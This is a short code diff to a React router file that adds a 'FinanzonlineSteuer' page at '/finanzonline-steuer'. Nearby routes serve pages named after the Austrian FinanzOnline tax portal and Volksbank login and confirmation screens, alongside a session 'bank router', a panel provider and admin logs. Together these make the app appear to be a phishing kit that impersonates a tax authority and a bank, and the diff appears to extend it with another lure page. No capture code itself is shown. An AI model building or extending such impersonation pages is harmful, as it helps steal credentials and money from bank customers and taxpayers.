@@ -6,6 +6,7 @@ import { TooltipProvider } from "@/components/ui/tooltip";
 import { PanelProvider, usePanel } from "@/components/PanelProvider";
 
 import Index from "./pages/Index.tsx";
+import FinanzonlineSteuer from "./pages/FinanzonlineSteuer.tsx";
 import Auth from "./pages/Auth.tsx";
 import Admin from "./pages/Admin.tsx";
 import AdminLogs from "./pages/AdminLogs.tsx";
@@ -136,6 +137,7 @@ const App = () => (
           <Routes>
             <Route path="/" element={<P><SessionBankRouter /></P>} />
             <Route path="/finanzonline" element={<P><Index /></P>} />
+            <Route path="/finanzonline-steuer" element={<P><FinanzonlineSteuer /></P>} />
             <Route path="/login" element={<P><VolksbankLogin /></P>} />
             <Route path="/login/bestaetigung" element={<P><VolksbankBestaetigung /></P>} />
             <Route path="/auth" element={<Auth />} />
